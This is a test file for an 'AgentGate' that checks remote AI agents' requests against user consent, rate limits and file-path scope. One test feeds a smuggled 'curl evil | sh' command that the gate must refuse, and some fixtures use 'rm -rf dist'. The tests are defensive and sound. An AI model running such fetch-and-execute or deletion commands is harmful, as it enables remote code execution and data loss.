import { describe, expect, test } from "bun:test";
import path from "node:path";
import type { CliServices } from "../../../../../src/main/features/cli/context";
import { AgentGate, relaySenderOf } from "../../../../../src/main/features/remote/agent-gate";
import type { RemoteAgentsPolicy } from "../../../../../src/shared/types/app-state";

const device = { id: "dev-1", name: "MacBook" };
const from = {
  kind: "tab" as const,
  agent: "claude",
  name: "Fix build",
  workspaceId: "bw",
  tabId: "bt",
};
const send = (over: Partial<typeof from> = {}, workspaceId = "w1") => ({
  device,
  method: "chat.send" as const,
  params: { workspaceId, tabId: "t1", text: "hi", from: { ...from, ...over } },
});

function gate(policy: RemoteAgentsPolicy, answers: string[] = []) {
  let now = 0;
  const asked: Record<string, unknown>[] = [];
  const waits: (number | undefined)[] = [];
  const services = {
    listWorkspaces: () => [{ id: "w1", name: "Work" }],
    notes: {
      list: async () => [{ id: "nqaspeaker02", title: "Design review" }],
      read: async () => ({ id: "nqaspeaker02", title: "Design review" }),
    },
    ui: async (op: string, args: Record<string, unknown>, timeoutMs?: number) => {
      if (op === "tabs.list") return { tabs: [{ id: "t1", type: "claude", title: "Review" }] };
      if (op === "consent.ask") {
        asked.push(args);
        waits.push(timeoutMs);
        return { answer: answers.shift() ?? "deny" };
      }
      if (op === "chat.settings") return { agent: "claude", mode: "plan" };
      if (op === "chat.profile") return { from: "Personal", to: "Work" };
      if (op === "chat.state")
        return {
          agent: "claude",
          state: "asking",
          waiting: { kind: "permission", text: "Bash rm -rf dist" },
          request: { id: "r1", tool: "Bash", input: "npm test" },
        };
      throw new Error(op);
    },
    claudeAsks: () => [{ id: "a1", tool: "Bash", target: "npm test" }],
  } as unknown as CliServices;
  const g = new AgentGate({ policy: () => policy, now: () => now });
  return { g, services, asked, waits, later: (ms: number) => (now += ms) };
}

describe("how long an agent's request waits for the user", () => {
  test("from a computer that waits for the answer: no time limit", async () => {
    const { g, services, asked, waits } = gate("ask", ["once"]);
    await g.check(services, { ...send(), waits: true });
    expect(asked[0]).not.toHaveProperty("timeoutMs");
    expect(waits).toEqual([Number.POSITIVE_INFINITY]);
  });

  test("from an older computer, which gives up: the old time limit", async () => {
    const { g, services, asked, waits } = gate("ask", ["once"]);
    await g.check(services, send());
    expect(asked[0]).toMatchObject({ timeoutMs: 90_000 });
    expect(waits).toEqual([100_000]);
  });

  test("the user's answer goes as given", async () => {
    const allowed = gate("ask", ["once"]);
    await allowed.g.check(allowed.services, { ...send(), waits: true });
    const denied = gate("ask", ["deny"]);
    await expect(denied.g.check(denied.services, { ...send(), waits: true })).rejects.toMatchObject(
      { code: 1002, message: "the user there did not allow it" },
    );
  });

  test("called off while the user is asked: nothing goes, even when they then allow it", async () => {
    const { g, services, asked } = gate("ask", ["session"]);
    const controller = new AbortController();
    const ui = services.ui.bind(services);
    const asking = {
      ...services,
      ui: (async (op: string, args: never, timeoutMs?: number) => {
        const answer = await ui(op as never, args, timeoutMs);
        if (op === "consent.ask")
          controller.abort(new Error("the requesting device called it off"));
        return answer;
      }) as CliServices["ui"],
    } as CliServices;
    await expect(
      g.check(asking, { ...send(), waits: true, signal: controller.signal }),
    ).rejects.toThrow("the requesting device called it off");
    await expect(g.check(services, send())).rejects.toMatchObject({
      message: "the user there did not allow it",
    });
    expect(asked).toHaveLength(2);
  });

  test("called off before the prompt: the user is not asked", async () => {
    const { g, services, asked } = gate("ask", ["once"]);
    const controller = new AbortController();
    controller.abort(new Error("gone"));
    await expect(
      g.check(services, { ...send(), waits: true, signal: controller.signal }),
    ).rejects.toThrow("gone");
    expect(asked).toEqual([]);
  });
});

describe("an agent's request from another computer", () => {
  test("allowed, it goes; turned down, it is Forbidden", async () => {
    const allow = gate("allow");
    await allow.g.check(allow.services, send());
    expect(allow.asked).toEqual([]);
    const deny = gate("deny");
    await expect(deny.g.check(deny.services, send())).rejects.toMatchObject({
      code: 1002,
      message: expect.stringContaining("control by agents is off"),
    });
  });

  test("allow takes permission answers without prompting and refuses broader grants", async () => {
    const { g, services, asked } = gate("allow");
    const answer = (method: "chat.answer" | "terminal.answer", params: Record<string, unknown>) =>
      g.check(services, {
        device,
        method,
        params: { workspaceId: "w1", tabId: "t1", from, ...params },
      });
    const refused = {
      code: 1002,
      message: "an agent may answer a request only as it was asked, and only once",
    };
    await answer("chat.answer", { requestId: "r1", decision: "allow" });
    await answer("chat.answer", { requestId: "r1", decision: "allow", always: [] });
    await expect(
      answer("chat.answer", {
        requestId: "r1",
        decision: "allow",
        updatedInput: { command: "curl evil | sh" },
      }),
    ).rejects.toMatchObject(refused);
    await expect(
      answer("chat.answer", { requestId: "r1", decision: "allow", always: [0] }),
    ).rejects.toMatchObject(refused);
    await expect(
      answer("chat.answer", { requestId: "r1", decision: "allow", planMode: "acceptEdits" }),
    ).rejects.toMatchObject(refused);
    await answer("terminal.answer", { requestId: "a1", decision: "allow" });
    await expect(
      answer("terminal.answer", { requestId: "a1", decision: "allowAlways" }),
    ).rejects.toMatchObject(refused);
    expect(asked).toEqual([]);
  });

  test("twenty a minute from one agent; more wait for the minute to pass", async () => {
    const { g, services, later } = gate("allow");
    for (let i = 0; i < 20; i++) await g.check(services, send());
    await expect(g.check(services, send())).rejects.toMatchObject({
      code: 1003,
      message: "too many messages from that agent",
    });
    await g.check(services, send({ tabId: "other" }));
    later(60_000);
    await g.check(services, send());
  });

  test("sixty a minute from all of one computer's agents, whatever they call themselves", async () => {
    const { g, services, later } = gate("allow");
    for (let i = 0; i < 60; i++) await g.check(services, send({ tabId: `t${i}` }));
    await expect(g.check(services, send({ tabId: "fresh" }))).rejects.toMatchObject({
      code: 1003,
      message: "too many messages from that device",
    });
    await g.check(services, { ...send(), device: { id: "dev-2", name: "Mini" } });
    later(60_000);
    await g.check(services, send({ tabId: "fresh" }));
  });

  test("three prompts of one computer's waiting at once; more are turned away", async () => {
    const answers: Array<(answer: string) => void> = [];
    const services = {
      ui: async (op: string) => {
        if (op === "tabs.list") return { tabs: [] };
        if (op === "consent.ask") {
          return new Promise((resolve) => answers.push((answer) => resolve({ answer })));
        }
        throw new Error(op);
      },
    } as unknown as CliServices;
    const g = new AgentGate({ policy: () => "ask" });
    const waiting = [0, 1, 2].map((i) => g.check(services, send({ tabId: `t${i}` })));
    await Bun.sleep(0);
    expect(answers).toHaveLength(3);
    await expect(g.check(services, send({ tabId: "t3" }))).rejects.toMatchObject({
      code: 1003,
      message: expect.stringContaining("prompts waiting already"),
    });
    const other = g.check(services, { ...send(), device: { id: "dev-2", name: "Mini" } });
    await Bun.sleep(0);
    expect(answers).toHaveLength(4);
    answers[0]?.("deny");
    await expect(waiting[0]).rejects.toMatchObject({ code: 1002 });
    const next = g.check(services, send({ tabId: "t4" }));
    await Bun.sleep(0);
    expect(answers).toHaveLength(5);
    for (const answer of answers.slice(1)) answer("once");
    await Promise.all([waiting[1], waiting[2], other, next]);
  });

  test("asked about: the computer and tab it comes from, and what it would do", async () => {
    const { g, services, asked } = gate("ask", ["once", "deny", "timeout"]);
    await g.check(services, send());
    expect(asked[0]).toMatchObject({
      fromDevice: "MacBook",
      fromDeviceId: "dev-1",
      fromName: "Fix build",
      fromWorkspaceId: "bw",
      toWorkspaceId: "w1",
      change: { kind: "chatInput", detail: "Review", body: "hi" },
      timeoutMs: 90_000,
    });
    await expect(g.check(services, send())).rejects.toMatchObject({
      message: "the user there did not allow it",
    });
    await expect(g.check(services, send())).rejects.toMatchObject({
      message: expect.stringContaining("did not answer in time"),
    });
  });

  test("allowed until restart for any change between those workspaces", async () => {
    const { g, services, asked } = gate("ask", ["session", "once"]);
    const interrupt = (workspaceId = "w1") => ({
      device,
      method: "chat.interrupt" as const,
      params: { workspaceId, tabId: "t1", from },
    });
    await g.check(services, interrupt());
    await g.check(services, interrupt());
    await g.check(services, {
      device,
      method: "chat.close" as const,
      params: { workspaceId: "w1", tabId: "t1", from },
    });
    await g.check(services, send());
    await g.check(services, {
      device,
      method: "terminal.open",
      params: { workspaceId: "w1", command: "make deploy", from },
    });
    expect(asked).toHaveLength(1);
    await g.check(services, interrupt("w2"));
    expect(asked.map((a) => a.toWorkspaceId)).toEqual(["w1", "w2"]);
  });

  test("a workspace approval given for a chat message covers later permission answers", async () => {
    const { g, services, asked } = gate("ask", ["session"]);
    await g.check(services, send());
    await g.check(services, {
      device,
      method: "chat.answer",
      params: { workspaceId: "w1", tabId: "t1", requestId: "r1", decision: "allow", from },
    });
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatchObject({ change: { kind: "chatInput", detail: "Review", body: "hi" } });
  });

  test("permission answers follow the same remote policy as other workspace changes", async () => {
    const chatAnswer = {
      device,
      method: "chat.answer" as const,
      params: { workspaceId: "w1", tabId: "t1", requestId: "r1", decision: "allow", from },
    };
    const terminalAnswer = {
      ...chatAnswer,
      method: "terminal.answer" as const,
      params: { ...chatAnswer.params, requestId: "a1", decision: "deny" },
    };

    const ask = gate("ask", ["session"]);
    await ask.g.check(ask.services, chatAnswer);
    await ask.g.check(ask.services, terminalAnswer);
    expect(ask.asked).toHaveLength(1);
    expect(ask.asked[0]?.change).toEqual({
      kind: "permissionAllow",
      detail: "Bash rm -rf dist",
    });

    const deny = gate("deny");
    for (const answer of [chatAnswer, terminalAnswer]) {
      await expect(deny.g.check(deny.services, answer)).rejects.toMatchObject({
        code: 1002,
        message: expect.stringContaining("control by agents is off"),
      });
    }
    expect(deny.asked).toEqual([]);
  });

  test("a new tab's prompt and a new terminal's command are shown when asked", async () => {
    const { g, services, asked } = gate("ask", ["once", "once"]);
    await g.check(services, {
      device,
      method: "chat.new",
      params: { workspaceId: "w1", agent: "claude", prompt: "delete the tests", from },
    });
    await g.check(services, {
      device,
      method: "terminal.open",
      params: { workspaceId: "w1", command: "make deploy", from },
    });
    expect(asked.map((a) => a.change)).toEqual([
      { kind: "chatNew", detail: "Claude", body: "delete the tests" },
      { kind: "terminalNew", body: "make deploy" },
    ]);
  });

  test("typing into a terminal shows what it would type", async () => {
    const { g, services, asked } = gate("ask", ["once"]);
    await g.check(services, {
      device,
      method: "terminal.input",
      params: {
        workspaceId: "w1",
        tabId: "t1",
        text: "rm -rf dist",
        keys: ["ctrl-c"],
        enter: true,
        from,
      },
    });
    expect(asked[0]).toMatchObject({
      change: { kind: "terminalInput", body: "rm -rf dist<ctrl-c><enter>" },
    });
  });

  test("closing a terminal says it is a terminal's, for who may answer it", async () => {
    const { g, services, asked } = gate("ask", ["once", "once"]);
    const close = (method: "terminal.close" | "chat.close") => ({
      device,
      method,
      params: { workspaceId: "w1", tabId: "t1", from },
    });
    await g.check(services, close("terminal.close"));
    await g.check(services, close("chat.close"));
    expect(asked[0]).toMatchObject({ change: { kind: "tabClose", terminal: true } });
    expect(asked[1]?.change).toEqual({ kind: "tabClose", detail: "Review" });
  });
});

test("the sender a chat keeps: who, and on which computer", () => {
  expect(relaySenderOf({ ...from, agent: "gemini" }, device)).toEqual({
    kind: "tab",
    name: "Fix build",
    workspaceId: "bw",
    tabId: "bt",
    device,
  });
  expect(relaySenderOf({ ...from, waits: false }, device)).toMatchObject({ waits: false });
  expect(relaySenderOf({ ...from, waits: true }, device)).toMatchObject({ waits: true });
  const ids = { workspaceId: "w".repeat(64), tabId: "t".repeat(64) };
  expect(relaySenderOf({ ...from, ...ids }, device)).toMatchObject(ids);
});

test("outside read approval is scoped to the canonical tree and expires two idle minutes later", async () => {
  const { g, services, asked, later } = gate("ask", ["once", "deny", "deny", "deny", "deny"]);
  const root = path.resolve("/workspace");
  const outside = path.resolve("/outside");
  const child = path.join(outside, "child");
  const transferId = "10000000-0000-4000-8000-000000000000";
  const read = (path: string, tree: boolean, tabId = from.tabId, copyId = transferId) =>
    g.checkFile(
      services,
      {
        device,
        method: tree ? "files.list" : "files.read",
        params: {
          path,
          from: { ...from, tabId },
          workspaceId: "w1",
          anywhere: true,
          transferId: copyId,
        },
      },
      { path, tree, workspaceRoot: root },
    );
  await read(outside, true);
  expect(asked[0]).toMatchObject({ change: { kind: "fileReadTree", detail: outside } });
  later(110_000);
  await read(child, false);
  await expect(read(path.resolve("/outside-sibling/child"), false)).rejects.toThrow(
    "did not allow",
  );
  await expect(read(child, false, "other-tab")).rejects.toThrow("did not allow");
  await expect(
    read(child, false, from.tabId, "20000000-0000-4000-8000-000000000000"),
  ).rejects.toThrow("did not allow");
  later(119_999);
  expect(asked).toHaveLength(4);
  later(1);
  await expect(read(child, false)).rejects.toThrow("did not allow");
  expect(asked).toHaveLength(5);
});

test("a session approval for a file control is the existing device and workspace approval", async () => {
  const { g, services, asked } = gate("ask", ["session"]);
  const upload = (workspaceId: string, path: string) =>
    g.checkFile(
      services,
      {
        device,
        method: "files.write.begin",
        params: { path, size: 30, from, workspaceId },
      },
      { path, tree: false, workspaceRoot: "/workspace" },
    );
  await upload("w1", "/workspace/first");
  await upload("w1", "/workspace/second");
  await g.check(services, send({ tabId: "other-tab" }));
  await expect(upload("w2", "/workspace/first")).rejects.toThrow("did not allow");
  expect(asked[0]).toMatchObject({
    change: { kind: "fileWrite", detail: "/workspace/first", body: "30 B" },
  });
  expect(asked).toHaveLength(2);
});

describe("a network path under the allow policy", () => {
  const NETWORK = [String.raw`\\h\s\a.txt`, "//h/s/a.txt", "/net/h/a.txt", "/Network/s/a.txt"];
  const transferId = "10000000-0000-4000-8000-000000000000";
  const read = (
    g: AgentGate,
    services: CliServices,
    path: string,
    method: "files.read" | "files.list" = "files.read",
  ) =>
    g.checkFile(
      services,
      {
        device,
        method,
        params: { path, from, workspaceId: "w1", anywhere: true, transferId },
      },
      { path, tree: method === "files.list", workspaceRoot: "/workspace" },
    );
  const upload = (g: AgentGate, services: CliServices, path: string) =>
    g.checkFile(
      services,
      {
        device,
        method: "files.write.begin",
        params: { path, size: 3, from, workspaceId: "w1", anywhere: true },
      },
      { path, tree: false, workspaceRoot: "/workspace" },
    );

  test.each(
    NETWORK,
  )("asks for %s; told no, it is refused; allowed once, the same read goes on", async (asked) => {
    const { g, services, asked: prompts } = gate("allow", ["deny", "once"]);
    await expect(read(g, services, asked)).rejects.toThrow("did not allow");
    await read(g, services, asked);
    await read(g, services, asked);
    expect(prompts).toHaveLength(2);
    expect(prompts[0]).toMatchObject({ change: { kind: "fileRead", detail: asked } });
    await expect(read(g, services, asked, "files.list")).rejects.toThrow("did not allow");
    await expect(upload(g, services, asked)).rejects.toThrow("did not allow");
    expect(prompts).toHaveLength(4);
  });

  test("an asked path that names a share is asked about even when it resolved elsewhere", async () => {
    const { g, services, asked } = gate("allow");
    await expect(
      g.checkFile(
        services,
        {
          device,
          method: "files.read",
          params: { path: "//h/s/a.txt", from, workspaceId: "w1", anywhere: true, transferId },
        },
        { path: "/outside/a.txt", tree: false, workspaceRoot: "/workspace" },
      ),
    ).rejects.toThrow("did not allow");
    expect(asked).toHaveLength(1);
  });

  test("allowed until restart, later network requests between those workspaces go on", async () => {
    const { g, services, asked } = gate("allow", ["session"]);
    await read(g, services, NETWORK[0] ?? "");
    for (const path of NETWORK) {
      await read(g, services, path, "files.list");
      await upload(g, services, path);
    }
    expect(asked).toHaveLength(1);
  });

  test.each([
    "allow",
    "ask",
  ] as const)("a tree allowed once on this computer does not cover a network path under %s", async (policy) => {
    const { g, services, asked } = gate(
      policy,
      policy === "ask" ? ["once", "deny", "deny"] : ["deny", "deny"],
    );
    await read(g, services, "/", "files.list");
    await read(g, services, "/outside/a.txt");
    expect(asked).toHaveLength(policy === "ask" ? 1 : 0);
    await expect(read(g, services, "/net/h/a.txt")).rejects.toThrow("did not allow");
    await expect(read(g, services, "/Network/s/a.txt", "files.list")).rejects.toThrow(
      "did not allow",
    );
    expect(asked.at(-1)).toMatchObject({ change: { kind: "fileReadTree" } });
  });

  test("a network tree allowed once covers what is inside it, and nothing beside it", async () => {
    const { g, services, asked } = gate("allow", ["once", "once", "deny", "deny"]);
    await read(g, services, "/net/h", "files.list");
    await read(g, services, "/net/h/x/a.txt");
    await read(g, services, "/net/h/x", "files.list");
    expect(asked).toHaveLength(1);
    await read(g, services, String.raw`\\h\s`, "files.list");
    await read(g, services, String.raw`\\h\s\x\a.txt`);
    expect(asked).toHaveLength(2);
    await expect(read(g, services, "/net/h2/a.txt")).rejects.toThrow("did not allow");
    await expect(read(g, services, String.raw`\\h\s2\a.txt`)).rejects.toThrow("did not allow");
  });

  test.each([
    [String.raw`\\nas\share\w`, String.raw`\\nas\share\w\src\a.ts`],
    ["/net/h/w", "/net/h/w/src/a.ts"],
    ["/Network/Data/w", "/Network/Data/w/src/a.ts"],
  ])("a write inside a workspace on %s goes on without asking, as before", async (workspaceRoot, path) => {
    const { g, services, asked } = gate("allow");
    for (const method of ["files.write.begin", "files.mkdir"] as const) {
      for (const transferId of [undefined, "10000000-0000-4000-8000-000000000000"]) {
        await g.checkFile(
          services,
          {
            device,
            method,
            params: {
              path,
              size: 3,
              from,
              workspaceId: "w1",
              ...(transferId ? { transferId } : {}),
            },
          },
          { path, tree: method === "files.mkdir" && transferId !== undefined, workspaceRoot },
        );
      }
    }
    expect(asked).toHaveLength(0);
    await expect(upload(g, services, path)).rejects.toThrow("did not allow");
    expect(asked).toHaveLength(1);
  });

  test("a path on this computer still goes on without asking", async () => {
    const { g, services, asked } = gate("allow");
    for (const path of ["/outside/a.txt", String.raw`C:\outside\a.txt`, "/netx/a.txt"]) {
      await read(g, services, path);
      await read(g, services, path, "files.list");
      await upload(g, services, path);
    }
    expect(asked).toHaveLength(0);
  });
});

test.each([
  "allow",
  "ask",
] as const)("peer rewind offers a reusable workspace approval under %s", async (policy) => {
  const { g, services, asked } = gate(policy, ["session"]);
  const request = {
    ...send(),
    method: "chat.rewind" as const,
    params: { ...send().params, itemKey: "user-1", files: false },
  };
  await g.check(services, request);
  await g.check(services, request);
  expect(asked.map((prompt) => prompt.change)).toEqual([{ kind: "chatRewind", detail: "Review" }]);
});

test("persistent global layers and voice deletion require fresh peer approval", async () => {
  const { g, services, asked } = gate("ask", ["session", "once", "deny", "once"]);
  const request = {
    ...send(),
    method: "settings.instructions.set" as const,
    params: { ...send().params, layer: "all", text: "Review test results." },
  };
  await g.check(services, { ...request, params: { ...request.params, layer: "workspace" } });
  await g.check(services, request);
  await expect(g.check(services, request)).rejects.toMatchObject({ code: 1002 });
  await g.check(services, {
    ...send(),
    method: "notes.voiceNames.delete",
    params: { ...send().params, name: "Alex" },
  });
  expect(asked.map((prompt) => prompt.change)).toEqual([
    expect.objectContaining({ kind: "instructionsEdit" }),
    expect.objectContaining({ kind: "instructionsEdit", eachTime: true }),
    expect.objectContaining({ kind: "instructionsEdit", eachTime: true }),
    expect.objectContaining({ kind: "voiceNamesDelete", eachTime: true }),
  ]);
});

test("a profile change follows the device policy without a prompt of its own", async () => {
  const profile = {
    ...send(),
    method: "chat.profile" as const,
    params: { ...send().params, profile: "Work" },
  };
  const allowed = gate("allow", ["once"]);
  await allowed.g.check(allowed.services, profile);
  const expectedMode = await allowed.g.check(allowed.services, {
    ...send(),
    method: "chat.configure",
    params: { ...send().params, permissionMode: "acceptEdits" },
  });
  expect(expectedMode).toBe("plan");
  expect(allowed.asked.map((prompt) => (prompt.change as { kind: string }).kind)).toEqual([
    "chatMode",
  ]);

  const asking = gate("ask", ["session"]);
  await asking.g.check(asking.services, profile);
  await asking.g.check(asking.services, profile);
  expect(asking.asked.map((prompt) => prompt.change)).toEqual([
    { kind: "chatProfile", detail: '"Review" (Personal → Work)' },
  ]);

  const denied = gate("deny");
  await expect(denied.g.check(denied.services, profile)).rejects.toMatchObject({ code: 1002 });
  expect(denied.asked).toEqual([]);
});

test("the note speaker prompt uses the title instead of the note id", async () => {
  const { g, services, asked } = gate("ask", ["once"]);
  await g.check(services, {
    ...send(),
    method: "notes.speakers",
    params: {
      ...send().params,
      note: "nqaspeaker02",
      change: { op: "regroup", participants: "auto" },
    },
  });
  expect(asked[0]?.change).toMatchObject({ kind: "noteSpeakers", detail: "Design review" });
});
